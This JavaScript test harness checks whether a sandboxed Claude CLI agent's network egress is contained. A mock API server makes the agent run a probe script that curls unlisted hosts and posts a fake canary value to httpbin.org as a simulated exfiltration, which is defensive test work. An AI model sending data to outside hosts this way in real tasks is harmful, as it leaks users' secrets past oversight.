import { spawn } from 'node:child_process'
import { createServer } from 'node:http'
import { mkdirSync, readFileSync, writeFileSync } from 'node:fs'
import { buildEnv } from '/app/dist/build-env.js'
import { CredentialProxy } from '/app/dist/credential-proxy.js'
import { agentAllowlist, allows } from '/app/dist/egress/allowlist.js'
import { EgressProxy } from '/app/dist/egress/egress-proxy.js'
import { probeDirectEgress, routeThroughGateway } from '/app/dist/egress/route.js'
import { GITHUB_AGENT_HOSTS } from '/app/dist/github/egress.js'

const mode = process.argv[2]
const LISTED = process.env.EGRESS_LISTED_REPO
const UNLISTED = 'https://example.com/'

const root = `/tmp/egress-${mode}`
mkdirSync(`${root}/claude`, { recursive: true })
mkdirSync(`${root}/work`, { recursive: true })

const PROBE = `${root}/probe.sh`
writeFileSync(
  PROBE,
  String.raw`
code() { curl -s -o /dev/null --max-time 10 -w '%{http_code}' "$@" 2>/dev/null; }
echo "direct=$(code --noproxy '*' ${UNLISTED})"
echo "unlisted=$(code ${UNLISTED})"
echo "exfiltrate=$(code --data 'canary=FAKE-ROMA-EGRESS-CANARY' https://httpbin.org/post)"
echo "gateway-without-token=$(code --noproxy '' --proxy ${'$'}{EGRESS_GATEWAY:-http://egress:3128} ${UNLISTED})"
echo "gateway-answer=$(curl -s -o /dev/null --max-time 10 -w '%{http_connect}' --noproxy '' --proxy ${'$'}{EGRESS_GATEWAY:-http://egress:3128} ${UNLISTED} 2>/dev/null)"
echo "listed=$(git ls-remote ${LISTED} HEAD >/dev/null 2>&1 && echo 200)"
`,
  { mode: 0o755 },
)

let turns = 0
let toolResult = ''
const sse = (res, type, data) =>
  res.write(`event: ${type}\ndata: ${JSON.stringify({ type, ...data })}\n\n`)
const api = createServer(async (req, res) => {
  let text = ''
  for await (const chunk of req) text += chunk
  if (!req.url.startsWith('/v1/messages') || req.url.includes('count_tokens')) {
    res.setHeader('content-type', 'application/json')
    res.end('{"input_tokens":1}')
    return
  }
  const body = JSON.parse(text)
  for (const message of body.messages ?? [])
    for (const block of Array.isArray(message.content) ? message.content : [])
      if (block.type === 'tool_result') toolResult += JSON.stringify(block.content)
  const tool = turns++ === 0
  res.writeHead(200, { 'content-type': 'text/event-stream' })
  sse(res, 'message_start', {
    message: {
      id: `msg_${turns}`,
      type: 'message',
      role: 'assistant',
      model: body.model,
      content: [],
      stop_reason: null,
      stop_sequence: null,
      usage: { input_tokens: 1, output_tokens: 1 },
    },
  })
  sse(res, 'content_block_start', {
    index: 0,
    content_block: tool
      ? { type: 'tool_use', id: 'toolu_probe', name: 'Bash', input: {} }
      : { type: 'text', text: '' },
  })
  sse(res, 'content_block_delta', {
    index: 0,
    delta: tool
      ? {
          type: 'input_json_delta',
          partial_json: JSON.stringify({ command: `sh ${PROBE}`, description: 'Probe' }),
        }
      : { type: 'text_delta', text: 'Done.' },
  })
  sse(res, 'content_block_stop', { index: 0 })
  sse(res, 'message_delta', {
    delta: { stop_reason: tool ? 'tool_use' : 'end_turn', stop_sequence: null },
    usage: { output_tokens: 1 },
  })
  sse(res, 'message_stop', {})
  res.end()
})
await new Promise((resolve) => api.listen(0, '127.0.0.1', resolve))
const apiUrl = `http://127.0.0.1:${api.address().port}`

const reached = (status) => (/^[23]\d\d$/.test(status) ? 'REACHED' : 'BLOCKED')

console.log(`roma-direct ${(await probeDirectEgress()) ? 'REACHED' : 'BLOCKED'}`)

let agentEgress = null
if (mode === 'contained') {
  const gateway = {
    url: process.env.EGRESS_GATEWAY,
    token: readFileSync(process.env.ROMA_EGRESS_TOKEN_FILE, 'utf8').trim(),
  }
  routeThroughGateway(gateway)
  agentEgress = await EgressProxy.listen({
    allow: allows(agentAllowlist(GITHUB_AGENT_HOSTS)),
    via: gateway,
  })
}
const romaStatus = await fetch(UNLISTED).then(
  (response) => String(response.status),
  () => '000',
)
console.log(`roma-through-gateway ${reached(romaStatus)}`)

const proxy = await CredentialProxy.listen({ upstream: apiUrl })
const env = buildEnv({
  credential: proxy.front({ kind: 'shared-window', oauthToken: 'sk-ant-oat01-FAKE-EGRESS' }),
  configDir: `${root}/claude`,
  ...(agentEgress === null ? {} : { egressProxy: agentEgress.url }),
})
if (mode === 'contained') env.EGRESS_GATEWAY = process.env.EGRESS_GATEWAY

const args = [
  '-p',
  '--input-format',
  'stream-json',
  '--output-format',
  'stream-json',
  '--verbose',
  '--permission-mode',
  'bypassPermissions',
  '--model',
  'claude-sonnet-5',
]
const child = spawn('claude', args, { env, cwd: `${root}/work`, stdio: ['pipe', 'pipe', 'pipe'] })
child.stdout.resume()
child.stderr.on('data', (chunk) => process.stderr.write(chunk))
child.stdin.end(
  JSON.stringify({
    type: 'user',
    message: { role: 'user', content: [{ type: 'text', text: 'Run the probe.' }] },
    parent_tool_use_id: null,
    session_id: '',
  }) + '\n',
)
const timeout = setTimeout(() => child.kill('SIGKILL'), 120_000)
const code = await new Promise((resolve) => child.on('exit', resolve))
clearTimeout(timeout)

process.stderr.write(`harness: claude exited ${code}, ${turns} API calls\n`)
console.log(`turns ${turns}`)
const results = toolResult.replace(/\\n/g, '\n')
process.stderr.write(`harness: ${results}\n`)
for (const check of ['direct', 'unlisted', 'exfiltrate', 'gateway-without-token', 'listed']) {
  const status = new RegExp(`(?<![\\w-])${check}=(\\d*)`).exec(results)?.[1] ?? ''
  console.log(`${check} ${reached(status)}`)
}

console.log(`gateway-answer ${/gateway-answer=(\d*)/.exec(results)?.[1] ?? ''}`)

await agentEgress?.close()
await proxy.close()
api.close()
process.exit(0)
